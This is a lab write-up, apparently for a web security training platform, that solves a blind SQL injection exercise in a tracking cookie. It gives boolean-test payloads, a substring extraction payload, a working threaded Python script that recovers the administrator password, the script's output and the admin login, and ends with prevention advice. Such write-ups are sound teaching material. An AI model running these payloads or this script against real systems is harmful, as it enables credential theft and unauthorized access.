# Lab 11: Blind SQL injection with conditional responses

**Goal**: Exploit a blind SQL injection vulnerability in the tracking cookie using conditional responses (`Welcome back!`) to extract the `administrator` password and log in to their account.

This lab contains a blind SQL injection vulnerability in the `TrackingId` cookie. The application uses this tracking cookie for analytics and executes a SQL query containing the submitted cookie value.

The query results are not directly returned in the response, and no database error messages are displayed. However, the application conditionally displays a **"Welcome back!"** message in the HTML whenever the backend query returns a row.

The database contains a `users` table with `username` and `password` columns.

---

## 🎯 Solution

1. Intercept a request in Burp Suite and identify the `TrackingId` cookie.
2. Verify the blind SQL injection vulnerability by testing boolean logic:
   - **TRUE**: `' AND '1'='1` → Returns `"Welcome back!"` ✅
   - **FALSE**: `' AND '1'='2` → Does **NOT** return `"Welcome back!"` ❌
3. Confirm the presence of the `administrator` user:
   ```sql
   ' AND (SELECT username FROM users WHERE username='administrator')='administrator
   ```
4. Build a conditional extraction payload to test individual password characters:
   ```sql
   ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
   ```
5. Use a Python script with `ThreadPoolExecutor` to automate testing all 20 character positions concurrently.
6. Extract the password (`dqfdzc2dydunehkwm2ee`) and log in as `administrator`.

![Lab 11 Solution Summary](Pasted%20image%2020260908234321.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Intercept and Test Injection Point
Intercept a request in Burp Suite Proxy and send it to **Repeater**:

```http
GET / HTTP/2
Host: your-lab-id.web-security-academy.net
Cookie: TrackingId=xppZCQtDyEg4ELYa; session=J3p0ZYJ8lo6FAzp9VadOdTvOe59Sp6dg
```

Send the original request and confirm that `"Welcome back!"` is present in the response body.

### Step 2: Confirm Boolean-Based Blind SQLi

#### Test TRUE Condition:
Append `' AND '1'='1` to the `TrackingId` cookie:
```http
Cookie: TrackingId=xppZCQtDyEg4ELYa' AND '1'='1; session=...
```
- **Response**: Contains `"Welcome back!"` ✅

#### Test FALSE Condition:
Append `' AND '1'='2` to the `TrackingId` cookie:
```http
Cookie: TrackingId=xppZCQtDyEg4ELYa' AND '1'='2; session=...
```
- **Response**: Does **NOT** contain `"Welcome back!"` ❌

> [!NOTE]
> The presence or absence of `"Welcome back!"` acts as a **boolean oracle** (TRUE / FALSE), allowing us to extract data character by character.

### Step 3: Verify Target User Existence
Test if the `administrator` user exists in the `users` table:
```http
Cookie: TrackingId=xppZCQtDyEg4ELYa' AND (SELECT username FROM users WHERE username='administrator')='administrator; session=...
```
- **Response**: Contains `"Welcome back!"` ✅ (Confirms `administrator` exists).

### Step 4: Automate Extraction with Python
Since manual testing of 20 positions across 36 characters (a-z, 0-9) requires up to 720 requests, automate the extraction using Python with `ThreadPoolExecutor`:

```python
import requests
import string
import urllib3
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Target configuration - Replace with your active lab details
url = "https://<YOUR-LAB-ID>.web-security-academy.net/"
session_cookie = "<YOUR-SESSION-COOKIE>"
tracking_id = "<YOUR-TRACKING-ID>"

characters = string.ascii_lowercase + string.digits
results = {}

def check_char(position, char):
    payload = (
        f"{tracking_id}' AND "
        f"(SELECT SUBSTRING(password,{position},1) FROM users WHERE username='administrator')='{char}"
    )
    cookies = {
        "TrackingId": payload,
        "session": session_cookie
    }
    
    response = requests.get(url, cookies=cookies, verify=False)
    if "Welcome back" in response.text:
        results[position] = char
        print(f"[+] Position {position:2d}: {char}")

print("[*] Extracting administrator password...")
with ThreadPoolExecutor(max_workers=10) as executor:
    for pos in range(1, 21):
        for char in characters:
            executor.submit(check_char, pos, char)

password = "".join(results[i] for i in sorted(results))
print(f"\n[✅] Extracted Password: {password}")
```

### Step 5: Execute Script
Run the script in terminal:
```bash
python3 blind_sqli.py
```

#### Output:
```text
[*] Extracting administrator password...
[+] Position  1: d
[+] Position  2: q
[+] Position  3: f
[+] Position  4: d
[+] Position  5: z
[+] Position  6: c
[+] Position  7: 2
[+] Position  8: d
[+] Position  9: y
[+] Position 10: d
[+] Position 11: u
[+] Position 12: n
[+] Position 13: e
[+] Position 14: h
[+] Position 15: k
[+] Position 16: w
[+] Position 17: m
[+] Position 18: 2
[+] Position 19: e
[+] Position 20: e

[✅] Extracted Password: dqfdzc2dydunehkwm2ee
```

### Step 6: Login as Administrator
Navigate to `/login` and submit:
- **Username**: `administrator`
- **Password**: `dqfdzc2dydunehkwm2ee`

> [!SUCCESS]
> **Lab Solved**: Successfully authenticated as Administrator!

---

## 💡 Key Takeaways: Blind SQLi Types Compared

| Blind SQLi Type | Oracle Mechanism | Performance | Technique |
|---|---|---|---|
| **Conditional Response** (Lab 11) | UI change (e.g. `"Welcome back!"` message) | Medium | Boolean Substring Check |
| **Conditional Error** | Database error (e.g. `1/0` division by zero) | Medium | Conditional Error Induction |
| **Time Delay** (Lab 09) | Server response timing delay (`pg_sleep`) | Slow | Response Delay Check |
| **Visible Error** (Lab 08) | Data inside error message (`CAST`) | Very Fast (1 request) | Error-based Exfiltration |

---

## 🔒 Prevention

> [!TIP]
> 1. **Use Parameterized Queries (Prepared Statements)**:
>    ```php
>    $stmt = $pdo->prepare("SELECT * FROM tracking WHERE id = ?");
>    $stmt->execute([$trackingId]);
>    ```
> 2. **Apply Principle of Least Privilege**: Limit database users to necessary permissions only.
> 3. **Implement Rate Limiting**: Limit request frequency to mitigate automated brute-force extraction.
